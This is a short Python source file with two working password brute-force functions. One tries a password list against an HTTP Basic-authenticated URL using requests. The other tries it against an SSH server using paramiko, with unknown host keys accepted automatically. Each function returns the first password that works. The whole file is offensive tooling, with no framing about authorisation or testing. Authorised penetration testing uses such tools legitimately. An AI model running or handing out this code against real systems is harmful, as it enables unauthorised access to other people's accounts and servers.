import requests
import paramiko
from threading import Thread

def brute_http_basic(target_url, username, password_list):
    found = False
    for pwd in password_list:
        try:
            response = requests.get(target_url, auth=(username, pwd.strip()))
            if response.status_code == 200:
                return f"[+] Password found: {pwd.strip()}"
        except Exception as e:
            continue
    return "[x] No valid password found (HTTP Basic)."

def brute_ssh(target_ip, port, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for pwd in password_list:
        try:
            client.connect(target_ip, port=port, username=username, password=pwd.strip(), timeout=2)
            client.close()
            return f"[+] SSH Password found: {pwd.strip()}"
        except:
            continue
    return "[x] No valid SSH password found."
